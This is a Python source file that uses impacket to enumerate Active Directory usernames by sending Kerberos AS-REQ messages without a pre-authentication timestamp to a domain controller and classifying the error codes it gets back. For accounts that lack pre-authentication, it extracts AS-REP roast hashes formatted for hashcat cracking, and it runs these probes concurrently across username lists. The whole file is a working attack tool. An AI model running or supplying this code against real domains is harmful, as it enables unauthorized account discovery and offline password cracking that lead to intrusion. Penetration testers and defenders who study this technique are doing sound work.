from __future__ import annotations

import asyncio
import datetime
import random
import socket
import struct
from functools import partial
from typing import Literal

from pyasn1.codec.der import decoder, encoder
from pyasn1.type.univ import noValue

from impacket.krb5 import constants
from impacket.krb5.asn1 import (
    AS_REP,
    AS_REQ,
    KERB_PA_PAC_REQUEST,
    KRB_ERROR,
    seq_set,
    seq_set_iter,
)
from impacket.krb5.types import KerberosTime, Principal


ProbeResult = Literal[
    "USER_EXISTS_PREAUTH",
    "USER_EXISTS_NOPREAUTH",
    "USER_DISABLED",
    "USER_NOT_EXIST",
    "TIMEOUT",
    "SKEW",
    "OTHER_ERR",
]


_AS_REQ_MSG_TYPE = 10
_PA_PAC_REQUEST = 128
_ETYPE_AES256 = 18
_ETYPE_AES128 = 17
_ETYPE_RC4_HMAC = 23

_ERR_PRINCIPAL_UNKNOWN = 6
_ERR_CLIENT_REVOKED = 18
_ERR_PREAUTH_REQUIRED = 25
_ERR_SKEW = 37
_ERR_ETYPE_NOSUPP = 14


def _build_asreq(username: str, domain: str, *, aes: bool = False) -> bytes:
    """Minimal AS-REQ with only PA-PAC-REQUEST padata (no PA-ENC-TIMESTAMP).

    Omitting the timestamp forces the KDC to respond with PREAUTH_REQUIRED
    rather than PREAUTH_FAILED - that is the distinguishing existence signal.
    """
    nt_principal = getattr(constants.PrincipalNameType.NT_PRINCIPAL, "value")
    client = Principal(username, type=nt_principal)
    server = Principal(f"krbtgt/{domain.upper()}", type=nt_principal)
    pac_req = KERB_PA_PAC_REQUEST()
    pac_req["include-pac"] = True

    req = AS_REQ()
    req["pvno"] = 5
    req["msg-type"] = _AS_REQ_MSG_TYPE
    req["padata"] = noValue
    req["padata"][0] = noValue
    req["padata"][0]["padata-type"] = _PA_PAC_REQUEST
    req["padata"][0]["padata-value"] = encoder.encode(pac_req)

    body = seq_set(req, "req-body")
    body["kdc-options"] = constants.encodeFlags([
        getattr(constants.KDCOptions.forwardable, "value"),
        getattr(constants.KDCOptions.renewable, "value"),
        getattr(constants.KDCOptions.proxiable, "value"),
    ])
    seq_set(body, "cname", client.components_to_asn1)
    seq_set(body, "sname", server.components_to_asn1)
    body["realm"] = domain.upper()
    until = datetime.datetime.now(datetime.timezone.utc) + datetime.timedelta(days=1)
    body["till"] = KerberosTime.to_asn1(until)
    body["rtime"] = KerberosTime.to_asn1(until)
    body["nonce"] = random.getrandbits(31)

    etypes = (_ETYPE_AES256, _ETYPE_AES128) if aes else (_ETYPE_RC4_HMAC,)
    seq_set_iter(body, "etype", etypes)
    return encoder.encode(req)


def _raw_send(kdc_ip: str, payload: bytes, timeout: float, port: int = 88) -> bytes:
    """TCP send/recv to KDC. Wire format: 4-byte BE length + payload.

    impacket's sendReceive() lacks a socket timeout, so we manage the
    socket ourselves to keep async fan-out from hanging on dead KDCs.
    """
    framed = struct.pack("!I", len(payload)) + payload
    with socket.create_connection((kdc_ip, port), timeout=timeout) as sock:
        sock.sendall(framed)
        prefix = b""
        while len(prefix) < 4:
            chunk = sock.recv(4 - len(prefix))
            if not chunk:
                raise ConnectionError("KDC closed before length prefix")
            prefix += chunk
        body_len = struct.unpack("!I", prefix)[0]
        body = b""
        while len(body) < body_len:
            chunk = sock.recv(body_len - len(body))
            if not chunk:
                raise ConnectionError("KDC closed mid-response")
            body += chunk
    return body


def probe_username(
    username: str, domain: str, kdc_ip: str,
    *, timeout: float = 3.0, port: int = 88,
) -> tuple[ProbeResult, str | None]:
    """Returns (result, asrep_hash_or_None). Hash present iff USER_EXISTS_NOPREAUTH."""
    try:
        raw = _raw_send(kdc_ip, _build_asreq(username, domain), timeout, port)
    except (socket.timeout, TimeoutError, OSError):
        return "TIMEOUT", None

    try:
        err_pkt, _ = decoder.decode(raw, asn1Spec=KRB_ERROR())
        code = int(err_pkt["error-code"])
    except Exception:
        try:
            as_rep, _ = decoder.decode(raw, asn1Spec=AS_REP())
            return "USER_EXISTS_NOPREAUTH", _format_asrep_hash(as_rep, username, domain)
        except Exception:
            return "OTHER_ERR", None

    if code == _ERR_PREAUTH_REQUIRED:
        return "USER_EXISTS_PREAUTH", None
    if code == _ERR_PRINCIPAL_UNKNOWN:
        return "USER_NOT_EXIST", None
    if code == _ERR_CLIENT_REVOKED:
        return "USER_DISABLED", None
    if code == _ERR_SKEW:
        return "SKEW", None
    if code == _ERR_ETYPE_NOSUPP:
        try:
            raw2 = _raw_send(kdc_ip, _build_asreq(username, domain, aes=True), timeout, port)
            try:
                err2, _ = decoder.decode(raw2, asn1Spec=KRB_ERROR())
                code2 = int(err2["error-code"])
                if code2 == _ERR_PREAUTH_REQUIRED:
                    return "USER_EXISTS_PREAUTH", None
                if code2 == _ERR_PRINCIPAL_UNKNOWN:
                    return "USER_NOT_EXIST", None
                if code2 == _ERR_CLIENT_REVOKED:
                    return "USER_DISABLED", None
            except Exception:
                as_rep2, _ = decoder.decode(raw2, asn1Spec=AS_REP())
                return "USER_EXISTS_NOPREAUTH", _format_asrep_hash(as_rep2, username, domain)
        except (socket.timeout, TimeoutError, OSError):
            return "TIMEOUT", None
        except Exception:
            pass
        return "USER_EXISTS_PREAUTH", None
    return "OTHER_ERR", None


def _format_asrep_hash(as_rep, username: str, domain: str) -> str:
    """Format an AS-REP packet as a hashcat-compatible AS-REP roast hash.

    hashcat modes: 18200 (RC4 etype 23), 19600 (AES128 etype 17), 19700 (AES256 etype 18).
    """
    from binascii import hexlify
    etype = int(as_rep["enc-part"]["etype"])
    cipher = bytes(as_rep["enc-part"]["cipher"])
    if etype == _ETYPE_RC4_HMAC:
        return (
            f"$krb5asrep$23${username}@{domain.upper()}:"
            f"{hexlify(cipher[:16]).decode()}${hexlify(cipher[16:]).decode()}"
        )
    return (
        f"$krb5asrep${etype}${username}${domain.upper()}$"
        f"{hexlify(cipher[-12:]).decode()}${hexlify(cipher[:-12]).decode()}"
    )


async def probe_many(
    usernames: list[str], domain: str, kdc_ip: str,
    *, concurrency: int = 30, timeout: float = 3.0,
) -> dict[str, tuple[ProbeResult, str | None]]:
    loop = asyncio.get_running_loop()
    sem = asyncio.Semaphore(concurrency)

    async def _one(name: str) -> tuple[str, tuple[ProbeResult, str | None]]:
        async with sem:
            bound = partial(probe_username, name, domain, kdc_ip, timeout=timeout)
            result = await loop.run_in_executor(None, bound)
            return name, result

    pairs = await asyncio.gather(*(_one(name) for name in usernames))
    return dict(pairs)
